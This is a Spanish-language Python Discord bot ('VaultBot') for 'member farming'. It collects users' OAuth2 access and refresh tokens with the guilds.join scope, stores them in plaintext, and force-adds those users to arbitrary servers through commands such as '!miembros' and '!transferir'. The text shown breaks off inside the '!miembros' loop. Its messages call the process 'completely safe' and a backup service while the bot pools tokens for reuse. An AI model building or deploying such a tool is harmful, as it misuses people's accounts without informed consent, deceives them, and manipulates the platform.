import discord
import requests
import json
import fastapi
import uvicorn
import os
import multiprocessing
import random
import time
import asyncio
import urllib.parse
import datetime

from discord.ext import commands
from multiprocessing import Process
from fastapi import Query
from fastapi.responses import HTMLResponse

# ══════════════════════════════════════════════════════════════════════════════
#  CONFIGURACIÓN
# ══════════════════════════════════════════════════════════════════════════════

config = {}
try:
    with open('config.json', 'r') as f:
        config = json.load(f)
except:
    pass

token    = os.getenv('DISCORD_TOKEN') or config.get('token')
secret   = os.getenv('CLIENT_SECRET') or config.get('secret')
app_id   = os.getenv('CLIENT_ID') or config.get('id')
redirect = os.getenv('REDIRECT_URI') or config.get('redirect')
api      = os.getenv('API_ENDPOINT') or config.get('api_endpoint') or "https://discord.com/api/v10"
logs     = os.getenv('WEBHOOK_LOGS', '[]')
if isinstance(logs, str):
    try:
        logs = json.loads(logs)
    except:
        logs = config.get('logs', [])

BOT_NAME = "VaultBot"
PREFIJO  = "!"

# ── IDs de canales ──
# canal_general    → #tutorial        (guía completa del bot)
# canal_invitar_bot → #invitar-bot    (enlace para invitar el bot)
# canal_verificar  → #autentificar    (enlace OAuth2 para usuarios)
# canal_miembros   → #farmear-miembros (comandos de dar miembros)
CANAL_TUTORIAL      = int(os.getenv('CANAL_GENERAL',      config.get('canal_general',      0)))
CANAL_INVITAR_BOT   = int(os.getenv('CANAL_INVITAR_BOT',  config.get('canal_invitar_bot',  0)))
CANAL_VERIFICAR     = int(os.getenv('CANAL_VERIFICAR',    config.get('canal_verificar',    0)))
CANAL_MIEMBROS      = int(os.getenv('CANAL_MIEMBROS',     config.get('canal_miembros',     0)))

OWNER_ID = int(os.getenv('OWNER_ID', config.get('owner_id', 0)))

WEBHOOKS_FILE = 'webhooks.json'

def cargar_webhooks():
    if os.path.exists(WEBHOOKS_FILE):
        with open(WEBHOOKS_FILE, 'r') as f:
            return json.load(f)
    return {}

def guardar_webhooks(data):
    with open(WEBHOOKS_FILE, 'w') as f:
        json.dump(data, f, indent=2)

guild_webhooks: dict = cargar_webhooks()

# ══════════════════════════════════════════════════════════════════════════════
#  FASTAPI + BOT
# ══════════════════════════════════════════════════════════════════════════════
app     = fastapi.FastAPI()
intents = discord.Intents.all()
bot     = commands.Bot(command_prefix=PREFIJO, intents=intents)
bot.remove_command('help')

# ══════════════════════════════════════════════════════════════════════════════
#  EVENTOS
# ══════════════════════════════════════════════════════════════════════════════
@bot.event
async def on_ready():
    os.system('cls || clear')
    await bot.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name=f"{PREFIJO}ayuda | {BOT_NAME}"
        )
    )
    print(f"[{BOT_NAME}] ✅ Conectado como: {bot.user}")
    print(f"[{BOT_NAME}] Prefijo: {PREFIJO}")
    print(f"[{BOT_NAME}] Servidores: {len(bot.guilds)}")

    # ── #tutorial: guía completa del bot ──
    if CANAL_TUTORIAL:
        canal = bot.get_channel(CANAL_TUTORIAL)
        if canal:
            async for msg in canal.history(limit=20):
                if msg.author == bot.user:
                    await msg.delete()
            await enviar_mensaje_tutorial(canal)

    # ── #invitar-bot: enlace para invitar el bot ──
    if CANAL_INVITAR_BOT:
        canal = bot.get_channel(CANAL_INVITAR_BOT)
        if canal:
            async for msg in canal.history(limit=20):
                if msg.author == bot.user:
                    await msg.delete()
            await enviar_mensaje_invitar_bot(canal)

    # ── #autentificar: enlace OAuth2 para usuarios ──
    if CANAL_VERIFICAR:
        canal = bot.get_channel(CANAL_VERIFICAR)
        if canal:
            async for msg in canal.history(limit=20):
                if msg.author == bot.user:
                    await msg.delete()
            await enviar_mensaje_autentificar(canal)

    # ── #farmear-miembros: explicación de comandos ──
    if CANAL_MIEMBROS:
        canal = bot.get_channel(CANAL_MIEMBROS)
        if canal:
            async for msg in canal.history(limit=20):
                if msg.author == bot.user:
                    await msg.delete()
            await enviar_mensaje_farmear(canal)


@bot.event
async def on_guild_join(guild):
    print(f"[{BOT_NAME}] Unido a nuevo servidor: {guild.name} ({guild.id})")
    embed = discord.Embed(
        title="🆕 Bot añadido a un servidor",
        description=f"**Servidor:** {guild.name}\n**ID:** `{guild.id}`\n**Miembros:** `{guild.member_count}`",
        color=discord.Color.green(),
        timestamp=datetime.datetime.now()
    )
    embed.set_footer(text=pie_embed())
    await enviar_log(embed)


@bot.event
async def on_message(message):
    if message.author.bot:
        return

    ctx = await bot.get_context(message)

    if ctx.valid and ctx.command:
        nombre_cmd = ctx.command.name

        cmds_owner    = {'transferir', 'refrescar', 'contar', 'estado'}
        cmds_miembros = {'miembros'}
        cmds_verificar = {'enlace'}

        # Comandos de owner y miembros → solo en #farmear-miembros
        if nombre_cmd in cmds_owner or nombre_cmd in cmds_miembros:
            if CANAL_MIEMBROS and message.channel.id != CANAL_MIEMBROS:
                await message.channel.send(
                    embed=embed_error(f"❌ Ese comando solo se puede usar en <#{CANAL_MIEMBROS}>."),
                    delete_after=5
                )
                await message.delete()
                return

        # !enlace → solo en #autentificar
        if nombre_cmd in cmds_verificar:
            if CANAL_VERIFICAR and message.channel.id != CANAL_VERIFICAR:
                await message.channel.send(
                    embed=embed_error(f"❌ Ese comando solo se puede usar en <#{CANAL_VERIFICAR}>."),
                    delete_after=5
                )
                await message.delete()
                return

    await bot.process_commands(message)


# ══════════════════════════════════════════════════════════════════════════════
#  FASTAPI
# ══════════════════════════════════════════════════════════════════════════════
def iniciar_fastapi():
    uvicorn.run("bot:app", host='0.0.0.0', port=8000, reload=False)

def mantener_vivo():
    Process(target=iniciar_fastapi).start()

@app.get("/")
async def inicio():
    return {"estado": "activo", "bot": BOT_NAME}

@app.get('/callback')
def autenticar(code=Query(...)):
    try:
        datos = {
            'client_id':     app_id,
            'client_secret': secret,
            'grant_type':    'authorization_code',
            'code':          code,
            'redirect_uri':  redirect,
            'scope':         'identify guilds.join'
        }
        respuesta = requests.post(f'{api}/oauth2/token', data=datos)
        respuesta.raise_for_status()
        detalles = respuesta.json()

        access_token  = detalles['access_token']
        refresh_token = detalles['refresh_token']

        cabeceras    = {'Authorization': f'Bearer {access_token}'}
        info_usuario = requests.get(f'{api}/users/@me', headers=cabeceras).json()
        user_id      = info_usuario['id']
        username     = info_usuario.get('username', 'desconocido')

        lineas = []
        if os.path.exists('auths.txt'):
            with open('auths.txt', 'r') as f:
                lineas = f.readlines()

        encontrado = False
        for i, linea in enumerate(lineas):
            if linea.startswith(f"{user_id},"):
                lineas[i] = f'{user_id},{access_token},{refresh_token}\n'
                encontrado = True
                break
        if not encontrado:
            lineas.append(f'{user_id},{access_token},{refresh_token}\n')

        with open('auths.txt', 'w') as f:
            f.writelines(lineas)

        embed_log = discord.Embed(
            title="✅ Nueva autenticación",
            description=f"**{username}** se autenticó correctamente.",
            color=discord.Color.green(),
            timestamp=datetime.datetime.now()
        )
        embed_log.add_field(name="👤 Usuario",       value=f"`{username}`",              inline=True)
        embed_log.add_field(name="🆔 ID",            value=f"`{user_id}`",               inline=True)
        embed_log.add_field(name="🔑 Token parcial", value=f"`{access_token[:20]}...`",  inline=False)
        embed_log.set_footer(text=pie_embed())
        enviar_log_sync(embed_log)

        html = generar_html_respuesta(
            titulo="✅ ¡Autenticación exitosa!",
            mensaje=f"Bienvenido, <strong>{username}</strong>.",
            subtexto="Ya puedes cerrar esta pestaña.",
            color_titulo="#57f287"
        )
        return HTMLResponse(content=html)

    except Exception as e:
        print(f"[Error de autenticación] {e}")
        embed_err = discord.Embed(
            title="❌ Error de autenticación",
            description=f"Error: `{str(e)}`",
            color=discord.Color.red(),
            timestamp=datetime.datetime.now()
        )
        embed_err.set_footer(text=pie_embed())
        enviar_log_sync(embed_err)

        html = generar_html_respuesta(
            titulo="❌ Error de autenticación",
            mensaje=f"Error: {str(e)}",
            subtexto="Inténtalo de nuevo más tarde.",
            color_titulo="#ed4245"
        )
        return HTMLResponse(content=html, status_code=500)


# ══════════════════════════════════════════════════════════════════════════════
#  UTILIDADES
# ══════════════════════════════════════════════════════════════════════════════
def pie_embed():
    return f"{BOT_NAME} • Sistema de autenticación"

def embed_error(descripcion: str) -> discord.Embed:
    return discord.Embed(description=descripcion, color=discord.Color.red())

def embed_ok(titulo: str, descripcion: str) -> discord.Embed:
    return discord.Embed(title=titulo, description=descripcion, color=discord.Color.green(),
                         timestamp=datetime.datetime.now())

def barra_progreso(actual, total, longitud=20):
    lleno = int(longitud * actual // total) if total > 0 else 0
    barra = '█' * lleno + '─' * (longitud - lleno)
    return f"`[{barra}]` {actual}/{total}"

def agregar_miembro(guild_id, user_id, access_token):
    url       = f"{api}/guilds/{guild_id}/members/{user_id}"
    datos     = {"access_token": access_token}
    cabeceras = {
        "Authorization": f"Bot {token}",
        "Content-Type":  "application/json"
    }
    try:
        r = requests.put(url, headers=cabeceras, json=datos)
        return r.status_code in (201, 204)
    except Exception as e:
        print(f"[Error al agregar] {e}")
        return False

async def obtener_nombre(access_token):
    cabeceras = {'Authorization': f'Bearer {access_token}'}
    try:
        r = requests.get(f'{api}/users/@me', headers=cabeceras)
        if r.status_code == 200:
            u = r.json()
            return u.get('global_name') or u.get('username', 'desconocido')
        return "desconocido"
    except:
        return "desconocido"

def contar_auths():
    if not os.path.exists('auths.txt'):
        return 0
    usuarios = set()
    with open('auths.txt', 'r') as f:
        for linea in f:
            try:
                uid, _, _ = linea.strip().split(',')
                usuarios.add(uid)
            except:
                continue
    return len(usuarios)

def usuario_autenticado(user_id: int) -> bool:
    """Comprueba si un usuario (por su Discord ID) está en auths.txt."""
    if not os.path.exists('auths.txt'):
        return False
    sid = str(user_id)
    with open('auths.txt', 'r') as f:
        for linea in f:
            try:
                uid, _, _ = linea.strip().split(',')
                if uid == sid:
                    return True
            except:
                continue
    return False

def enviar_log_sync(embed: discord.Embed):
    """
    Envía el embed al log 1 (primario).
    Si falla, lo intenta con el log 2 (backup).
    Log 1 → notificaciones principales
    Log 2 → backup para no perder nada si el log 1 está caído
    """
    if not logs:
        return
    # Intentar con log 1 (índice 0)
    try:
        r = requests.post(logs[0], json={'embeds': [embed.to_dict()]}, timeout=5)
        if r.status_code in (200, 204):
            return  # Éxito con log 1, no hace falta el 2
    except Exception as e:
        print(f"[Log 1 error] {e}")
    # Si log 1 falla → intentar con log 2 (índice 1)
    if len(logs) > 1:
        try:
            requests.post(logs[1], json={'embeds': [embed.to_dict()]}, timeout=5)
        except Exception as e:
            print(f"[Log 2 error] {e}")

async def enviar_log(embed: discord.Embed):
    enviar_log_sync(embed)

def generar_html_respuesta(titulo, mensaje, subtexto, color_titulo):
    return f"""<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>{BOT_NAME}</title>
    <style>
        * {{ margin:0; padding:0; box-sizing:border-box; }}
        body {{ background:#2b2d31; color:#fff; font-family:'Segoe UI',Arial,sans-serif;
                display:flex; align-items:center; justify-content:center; min-height:100vh; }}
        .card {{ background:#313338; border-radius:16px; padding:40px 50px;
                 text-align:center; max-width:420px; box-shadow:0 8px 32px rgba(0,0,0,.4); }}
        h1 {{ color:{color_titulo}; font-size:1.6rem; margin-bottom:12px; }}
        p  {{ color:#b5bac1; margin:6px 0; }}
        strong {{ color:#fff; }}
        hr {{ border:none; border-top:1px solid #404249; margin:20px 0; }}
        small {{ color:#72767d; font-size:.8rem; }}
    </style>
</head>
<body>
    <div class="card">
        <h1>{titulo}</h1>
        <p>{mensaje}</p>
        <p>{subtexto}</p>
        <hr>
        <small>{BOT_NAME} — Sistema de autenticación</small>
    </div>
</body>
</html>"""

def generar_enlace_oauth():
    params = {
        'client_id':     app_id,
        'response_type': 'code',
        'redirect_uri':  redirect,
        'scope':         'identify guilds.join'
    }
    return "https://discord.com/oauth2/authorize?" + urllib.parse.urlencode(params)

def generar_enlace_invitar_bot():
    params = {
        'client_id':   app_id,
        'permissions': '8',
        'scope':       'bot applications.commands'
    }
    return "https://discord.com/oauth2/authorize?" + urllib.parse.urlencode(params)


# ══════════════════════════════════════════════════════════════════════════════
#  MENSAJES AUTOMÁTICOS DE CANALES
# ══════════════════════════════════════════════════════════════════════════════

async def enviar_mensaje_tutorial(canal: discord.TextChannel):
    """
    #tutorial — Guía completa de uso de VaultBot.
    Explica todo el sistema, paso a paso, con comandos y descripción.
    """
    link_bot  = generar_enlace_invitar_bot()
    link_auth = generar_enlace_oauth()

    embed = discord.Embed(
        title="📖 Bienvenido a VaultBot — Guía completa",
        description=(
            "**VaultBot** es un sistema de backup y restauración de miembros para Discord.\n"
            "Permite guardar usuarios autenticados y añadirlos a cualquier servidor automáticamente.\n\u200b"
        ),
        color=discord.Color.purple(),
        timestamp=datetime.datetime.now()
    )

    embed.add_field(
        name="━━━ 📋 ¿Cómo funciona? ━━━",
        value="\u200b",
        inline=False
    )
    embed.add_field(
        name="**Paso 1 — Invita el bot a tu servidor**",
        value=(
            f"Usa el canal <#{CANAL_INVITAR_BOT}> para obtener el enlace de invitación.\n"
            f"[👉 Invitar VaultBot]({link_bot})\n\u200b"
        ),
        inline=False
    )
    embed.add_field(
        name="**Paso 2 — Registra tu webhook**",
        value=(
            "Una vez el bot esté en tu servidor, escribe en él:\n"
            "`!setwebhook <url_de_tu_webhook>`\n"
            "Esto vincula tu servidor para poder recibir miembros.\n\u200b"
        ),
        inline=False
    )
    embed.add_field(
        name="**Paso 3 — Consigue autenticaciones**",
        value=(
            f"Comparte el enlace del canal <#{CANAL_VERIFICAR}> con tus usuarios.\n"
            f"Cada usuario que haga clic y acepte quedará guardado en la base de datos.\n"
            f"[🔗 Enlace de autenticación]({link_auth})\n\u200b"
        ),
        inline=False
    )
    embed.add_field(
        name="**Paso 4 — Da miembros a tu servidor**",
        value=(
            f"Ve al canal <#{CANAL_MIEMBROS}> y usa:\n"
            f"`!miembros <cantidad>` — por ejemplo: `!miembros 100`\n"
            f"El bot añade automáticamente los usuarios autenticados a tu servidor.\n\u200b"
        ),
        inline=False
    )

    embed.add_field(
        name="━━━ 🤖 Comandos disponibles ━━━",
        value="\u200b",
        inline=False
    )
    embed.add_field(
        name="Comandos generales",
        value=(
            "`!ayuda` — Muestra esta guía dentro de Discord\n"
            "`!invitarbot` — Enlace para invitar el bot\n"
            "`!enlace` — Enlace OAuth2 para que los usuarios se autentiquen\n"
            "`!estado` — Estadísticas del bot en tiempo real\n"
            "`!setwebhook <url>` — Registra el webhook de tu servidor\n\u200b"
        ),
        inline=False
    )
    embed.add_field(
        name="Comandos de farmeo (en #farmear-miembros)",
        value=(
            "`!miembros <cantidad>` — Añade usuarios autenticados a tu servidor\n"
            "`!contar` — Cuántos usuarios hay en la base de datos\n"
            "`!refrescar` — Renueva los tokens de todos los usuarios\n"
            "`!transferir <guild_id> <cantidad>` — Transfiere a otro servidor por ID\n\u200b"
        ),
        inline=False
    )

    embed.add_field(
        name="━━━ ⚠️ Importante ━━━",
        value=(
            "• Solo los **administradores** pueden registrar un webhook con `!setwebhook`.\n"
            "• **Tú** (el owner del bot) puedes usar `!contar`, `!refrescar` y `!transferir`.\n"
            "• Debes estar **autenticado** para poder usar `!miembros`.\n"
            "• Los tokens se renuevan con `!refrescar` — hazlo cada 7-14 días.\n\u200b"
        ),
        inline=False
    )

    embed.set_footer(text=pie_embed())

    vista = discord.ui.View()
    vista.add_item(discord.ui.Button(
        label="Invitar VaultBot", style=discord.ButtonStyle.link, url=link_bot, emoji="🤖"
    ))
    vista.add_item(discord.ui.Button(
        label="Autenticarse", style=discord.ButtonStyle.link, url=link_auth, emoji="🔗"
    ))

    await canal.send(embed=embed, view=vista)


async def enviar_mensaje_invitar_bot(canal: discord.TextChannel):
    """
    #invitar-bot — Solo muestra el enlace para invitar el bot al servidor.
    """
    link_bot = generar_enlace_invitar_bot()

    embed = discord.Embed(
        title="🤖 Invita VaultBot a tu servidor",
        description=(
            "Haz clic en el botón de abajo para añadir **VaultBot** a tu servidor de Discord.\n\n"
            "Una vez dentro, el bot te pedirá que registres tu webhook con:\n"
            f"`!setwebhook <url_de_tu_webhook>`\n\n"
            f"¿No sabes qué es un webhook? Ve al canal <#{CANAL_TUTORIAL}> para ver la guía completa.\n\u200b"
        ),
        color=discord.Color.blurple(),
        timestamp=datetime.datetime.now()
    )
    embed.add_field(
        name="🔗 Enlace directo",
        value=f"[👉 Haz clic aquí para invitar VaultBot]({link_bot})",
        inline=False
    )
    embed.add_field(
        name="📋 Después de invitarlo",
        value=(
            "**1.** Ve a tu servidor → Ajustes → Integraciones → Webhooks\n"
            "**2.** Crea un webhook en el canal que quieras\n"
            "**3.** Copia la URL y úsala con `!setwebhook <url>`"
        ),
        inline=False
    )
    embed.set_footer(text=pie_embed())

    vista = discord.ui.View()
    vista.add_item(discord.ui.Button(
        label="Invitar VaultBot", style=discord.ButtonStyle.link, url=link_bot, emoji="🤖"
    ))

    await canal.send(embed=embed, view=vista)


async def enviar_mensaje_autentificar(canal: discord.TextChannel):
    """
    #autentificar — Enlace OAuth2 para que los usuarios se autentiquen.
    """
    link_auth = generar_enlace_oauth()

    embed = discord.Embed(
        title="🔐 Autentícate con VaultBot",
        description=(
            "Para poder ser añadido automáticamente a servidores que usan **VaultBot**,\n"
            "necesitas autenticarte una sola vez con tu cuenta de Discord.\n\n"
            "Es **completamente seguro** — solo se solicitan permisos de identificación y acceso a servidores.\n\u200b"
        ),
        color=discord.Color.blue(),
        timestamp=datetime.datetime.now()
    )
    embed.add_field(
        name="✅ ¿Qué pasa cuando te autenticas?",
        value=(
            "• Tu usuario queda guardado en la base de datos del bot.\n"
            "• Podrás ser añadido a servidores que usen VaultBot automáticamente.\n"
            "• Recibirás una confirmación en el navegador.\n\u200b"
        ),
        inline=False
    )
    embed.add_field(
        name="🔗 Enlace de autenticación",
        value=f"[👉 **Haz clic aquí para autenticarte**]({link_auth})",
        inline=False
    )
    embed.add_field(
        name="⚠️ Nota",
        value=(
            "Si ya te autenticaste antes, volver a hacerlo simplemente actualiza tu token.\n"
            "No te autentica dos veces."
        ),
        inline=False
    )
    embed.set_footer(text=pie_embed())

    vista = discord.ui.View()
    vista.add_item(discord.ui.Button(
        label="Autenticarse ahora", style=discord.ButtonStyle.link, url=link_auth, emoji="🔗"
    ))

    await canal.send(embed=embed, view=vista)


async def enviar_mensaje_farmear(canal: discord.TextChannel):
    """
    #farmear-miembros — Explicación de todos los comandos para dar miembros.
    """
    embed = discord.Embed(
        title="🌾 Canal de farmeo de miembros",
        description=(
            "Aquí puedes usar todos los comandos para añadir miembros a tu servidor.\n"
            "**Debes estar autenticado** para poder usar `!miembros`.\n\u200b"
        ),
        color=discord.Color.green(),
        timestamp=datetime.datetime.now()
    )

    embed.add_field(
        name="━━━ 🚀 Comandos disponibles ━━━",
        value="\u200b",
        inline=False
    )
    embed.add_field(
        name="🌾 `!miembros <cantidad>`",
        value=(
            "Añade la cantidad indicada de usuarios autenticados a **tu servidor**.\n"
            "Requiere tener un webhook registrado con `!setwebhook`.\n"
            "**Ejemplo:** `!miembros 100` → añade 100 usuarios.\n\u200b"
        ),
        inline=False
    )
    embed.add_field(
        name="🔢 `!contar`",
        value=(
            "Muestra cuántos usuarios únicos hay en la base de datos de autenticaciones.\n"
            "*(Solo owner)*\n\u200b"
        ),
        inline=False
    )
    embed.add_field(
        name="🔄 `!refrescar`",
        value=(
            "Renueva los tokens de todos los usuarios guardados para que no expiren.\n"
            "Úsalo cada **7-14 días** para mantener los tokens activos.\n"
            "*(Solo owner)*\n\u200b"
        ),
        inline=False
    )
    embed.add_field(
        name="🔀 `!transferir <guild_id> <cantidad>`",
        value=(
            "Transfiere usuarios directamente a cualquier servidor por su ID.\n"
            "El bot debe estar en ese servidor.\n"
            "**Ejemplo:** `!transferir 123456789012345678 50`\n"
            "*(Solo owner)*\n\u200b"
        ),
        inline=False
    )
    embed.add_field(
        name="📊 `!estado`",
        value=(
            "Muestra estadísticas del bot: latencia, auths totales, servidores y webhooks activos.\n\u200b"
        ),
        inline=False
    )
    embed.add_field(
        name="━━━ ⚠️ Requisitos para !miembros ━━━",
        value=(
            "✅ Debes tener tu webhook registrado (`!setwebhook <url>`)\n"
            "✅ Debes estar autenticado (haber pasado por <#{}>)\n"
            "✅ Debe haber usuarios en la base de datos\n"
            "✅ El bot debe estar en tu servidor".format(CANAL_VERIFICAR)
        ),
        inline=False
    )
    embed.set_footer(text=pie_embed())

    await canal.send(embed=embed)


# ══════════════════════════════════════════════════════════════════════════════
#  COMPROBACIONES DE PERMISOS
# ══════════════════════════════════════════════════════════════════════════════
def es_owner():
    async def predicate(ctx):
        if ctx.author.id != OWNER_ID:
            await ctx.send(embed=embed_error("❌ No tienes permiso para usar este comando."), delete_after=5)
            return False
        return True
    return commands.check(predicate)

def tiene_webhook():
    async def predicate(ctx):
        gid = str(ctx.guild.id)
        if gid not in guild_webhooks:
            await ctx.send(embed=embed_error(
                "❌ Este servidor no tiene webhook registrado.\n"
                f"El dueño debe usar `!setwebhook <url>` primero."
            ), delete_after=10)
            return False
        return True
    return commands.check(predicate)

def esta_autenticado():
    """
    Comprueba que el usuario que ejecuta el comando esté en auths.txt.
    Si no lo está, le dice que vaya a #autentificar primero.
    """
    async def predicate(ctx):
        if not usuario_autenticado(ctx.author.id):
            canal_ref = f"<#{CANAL_VERIFICAR}>" if CANAL_VERIFICAR else "`#autentificar`"
            await ctx.send(embed=embed_error(
                f"❌ No estás autenticado.\n"
                f"Ve a {canal_ref} y haz clic en el enlace de autenticación antes de usar este comando."
            ), delete_after=10)
            return False
        return True
    return commands.check(predicate)


# ══════════════════════════════════════════════════════════════════════════════
#  COMANDOS
# ══════════════════════════════════════════════════════════════════════════════

# ── !ayuda ────────────────────────────────────────────────────────────────────
@bot.command(name='ayuda')
async def ayuda(ctx):
    link_bot  = generar_enlace_invitar_bot()
    link_auth = generar_enlace_oauth()

    embed = discord.Embed(
        title=f"📖 {BOT_NAME} — Guía completa de comandos",
        description=(
            "Aquí tienes todos los comandos disponibles con su uso exacto.\n"
            "El prefijo es `!` — escríbelo antes de cada comando.\n\u200b"
        ),
        color=discord.Color.purple(),
        timestamp=datetime.datetime.now()
    )
    embed.add_field(name="━━━ 🌐 Comandos generales ━━━", value="\u200b", inline=False)
    embed.add_field(name="`!ayuda`",        value="Muestra esta guía completa.",                                  inline=False)
    embed.add_field(name="`!invitarbot`",   value="Muestra el enlace para invitar VaultBot a tu servidor.",       inline=False)
    embed.add_field(name="`!enlace`",       value="Genera el enlace OAuth2 para que los usuarios se autentiquen.", inline=False)
    embed.add_field(name="`!setwebhook <url>`", value=(
        "Registra el webhook de tu servidor para recibir miembros.\n"
        "Solo administradores. Úsalo una vez tras invitar el bot.\n\u200b"
    ), inline=False)

    embed.add_field(name="━━━ 🚀 Dar miembros ━━━", value="\u200b", inline=False)
    embed.add_field(name="`!miembros <cantidad>`", value=(
        "Añade usuarios autenticados a tu servidor.\n"
        "Requiere webhook registrado y estar autenticado.\n"
        f"Solo en <#{CANAL_MIEMBROS}>.\n\u200b"
    ), inline=False)

    embed.add_field(name="━━━ 🔧 Administración (solo owner) ━━━", value="\u200b", inline=False)
    embed.add_field(name="`!contar`",    value="Usuarios únicos en la base de datos.", inline=False)
    embed.add_field(name="`!refrescar`", value="Refresca los tokens de todos los usuarios guardados.", inline=False)
    embed.add_field(name="`!estado`",    value="Estadísticas del bot en tiempo real.", inline=False)
    embed.add_field(name="`!transferir <guild_id> <cantidad>`", value=(
        "Transfiere usuarios a cualquier servidor por ID.\n"
        "**Ejemplo:** `!transferir 123456789 100`\n\u200b"
    ), inline=False)

    embed.add_field(name="━━━ 📋 Paso a paso ━━━", value=(
        f"**1.** Invita el bot → [Enlace]({link_bot})\n"
        f"**2.** `!setwebhook <tu_webhook>` en tu servidor\n"
        f"**3.** Comparte el enlace de auth → [Enlace]({link_auth})\n"
        f"**4.** `!miembros <cantidad>` para añadir usuarios\n\u200b"
    ), inline=False)

    embed.set_footer(text=pie_embed(),
                     icon_url=bot.user.avatar.url if bot.user.avatar else None)

    vista = discord.ui.View()
    vista.add_item(discord.ui.Button(label="Invitar bot",   style=discord.ButtonStyle.link, url=link_bot,  emoji="🤖"))
    vista.add_item(discord.ui.Button(label="Verificarse",   style=discord.ButtonStyle.link, url=link_auth, emoji="🔗"))
    await ctx.send(embed=embed, view=vista)


# ── !invitarbot ───────────────────────────────────────────────────────────────
@bot.command(name='invitarbot')
async def invitarbot(ctx):
    link_bot  = generar_enlace_invitar_bot()
    link_auth = generar_enlace_oauth()

    embed = discord.Embed(
        title="🤖 Invita VaultBot a tu servidor",
        description=(
            f"**🔗 Enlace para invitar el bot:**\n{link_bot}\n\n"
            f"**🔑 Enlace para autenticarse:**\n{link_auth}"
        ),
        color=discord.Color.blurple(),
        timestamp=datetime.datetime.now()
    )
    embed.add_field(name="📋 ¿Cómo empezar?", value=(
        "**1.** Invita el bot a tu servidor\n"
        "**2.** `!setwebhook <url>` con el webhook de tu server\n"
        "**3.** Comparte el enlace de auth con tus usuarios\n"
        "**4.** `!miembros <cantidad>` para añadir usuarios"
    ), inline=False)
    embed.set_footer(text=pie_embed(),
                     icon_url=bot.user.avatar.url if bot.user.avatar else None)

    vista = discord.ui.View()
    vista.add_item(discord.ui.Button(label="Invitar VaultBot",  style=discord.ButtonStyle.link, url=link_bot,  emoji="🤖"))
    vista.add_item(discord.ui.Button(label="Verificarse ahora", style=discord.ButtonStyle.link, url=link_auth, emoji="🔗"))
    await ctx.send(embed=embed, view=vista)


# ── !enlace ───────────────────────────────────────────────────────────────────
@bot.command(name='enlace')
async def enlace(ctx):
    url = generar_enlace_oauth()

    embed = discord.Embed(
        title="🔗 Enlace de autenticación",
        description=(
            "Comparte este enlace con los usuarios para que se verifiquen.\n\n"
            f"[👉 **Haz clic aquí para autenticarte**]({url})\n\n"
            "Al autenticarse, el usuario queda guardado en la base de datos "
            "y podrá ser añadido a servidores que usen VaultBot."
        ),
        color=discord.Color.blue(),
        timestamp=datetime.datetime.now()
    )
    embed.add_field(name="🔑 URL directa", value=f"`{url}`", inline=False)
    embed.set_footer(text=pie_embed(),
                     icon_url=bot.user.avatar.url if bot.user.avatar else None)

    vista = discord.ui.View()
    vista.add_item(discord.ui.Button(label="Autenticarse", style=discord.ButtonStyle.link, url=url, emoji="🔗"))
    await ctx.send(embed=embed, view=vista)


# ── !setwebhook ───────────────────────────────────────────────────────────────
@bot.command(name='setwebhook')
@commands.has_permissions(administrator=True)
async def setwebhook(ctx, url: str):
    if not url.startswith("https://discord.com/api/webhooks/"):
        await ctx.send(embed=embed_error(
            "❌ URL de webhook inválida.\n"
            "Debe ser algo como: `https://discord.com/api/webhooks/123/abc`"
        ), delete_after=10)
        return

    test = requests.get(url)
    if test.status_code != 200:
        await ctx.send(embed=embed_error(
            "❌ El webhook no responde. Comprueba que la URL sea válida."
        ), delete_after=10)
        return

    gid = str(ctx.guild.id)
    guild_webhooks[gid] = url
    guardar_webhooks(guild_webhooks)

    embed = discord.Embed(
        title="✅ Webhook registrado",
        description=(
            f"El webhook de **{ctx.guild.name}** ha sido guardado correctamente.\n\n"
            f"Ahora puedes usar `!miembros <cantidad>` para añadir usuarios."
        ),
        color=discord.Color.green(),
        timestamp=datetime.datetime.now()
    )
    embed.add_field(name="🏠 Servidor", value=f"`{ctx.guild.name}`", inline=True)
    embed.add_field(name="🆔 Guild ID", value=f"`{ctx.guild.id}`",   inline=True)
    embed.set_footer(text=pie_embed())
    await ctx.send(embed=embed)

    try:
        await ctx.message.delete()
    except:
        pass


# ── !miembros ─────────────────────────────────────────────────────────────────
@bot.command(name='miembros')
@esta_autenticado()   # ← el usuario debe estar en auths.txt
@tiene_webhook()      # ← el servidor debe tener webhook registrado
async def miembros(ctx, cantidad: int):
    inicio    = time.time()
    intentos  = 0
    agregados = 0
    fallidos  = 0
    ultimos   = []

    if cantidad <= 0:
        await ctx.send(embed=embed_error("❌ La cantidad debe ser mayor a 0."), delete_after=5)
        return

    if not os.path.exists('auths.txt'):
        await ctx.send(embed=discord.Embed(
            title="⚠️ Base de datos vacía",
            description="No hay usuarios autenticados todavía. Comparte el enlace de verificación primero.",
            color=discord.Color.orange(),
            timestamp=datetime.datetime.now()
        ))
        return

    with open('auths.txt', 'r') as f:
        lineas = f.readlines()

    usuarios_unicos = {}
    for linea in lineas:
        try:
            uid, at, rt = linea.strip().split(',')
            usuarios_unicos[uid] = (at, rt)
        except:
            continue

    total_disponible = len(usuarios_unicos)
    if total_disponible == 0:
        await ctx.send(embed=embed_error("⚠️ La base de datos está vacía."), delete_after=5)
        return

    cantidad_real = min(cantidad, total_disponible)
    lista = list(usuarios_unicos.items())
    random.shuffle(lista)

    embed_prog = discord.Embed(
        title=f"🚀 Añadiendo {cantidad_real} usuarios → {ctx.guild.name}",
        description=(
            f"Progreso: {barra_progreso(0, cantidad_real)}\n"
            f"Intentos: `0` | ✅ Añadidos: `0` | ❌ Fallidos: `0`"
        ),
        color=discord.Color.blue(),
        timestamp=datetime.datetime.now()
    )
    embed_prog.add_field(name="📊 Disponibles en BD", value=f"`{total_disponible}`", inline=True)
    embed_prog.add_field(name="🎯 Objetivo",          value=f"`{cantidad_real}`",    inline=True)
    embed_prog.set_footer(text=pie_embed(),
                          icon_url=bot.user.avatar.url if bot.user.avatar else None)
    msg = await ctx.send(embed=embed_prog)

    while agregados < cantidad_real and lista:
        intentos += 1
        uid, (at, rt) = lista.pop()
        exito = agregar_miembro(ctx.guild.id, uid, at)

        if exito:
            nombre = await obtener_nombre(at)
            ultimos.append(f"**{nombre}**")
            if len(ultimos) > 10:
                ultimos.pop(0)
            agregados += 1
        else:
            fallidos += 1

        if intentos % 5 == 0 or agregados == cantidad_real or not lista:
            ultimos_str = ', '.join(ultimos[-5:]) if ultimos else '*ninguno aún*'
            embed_prog.description = (
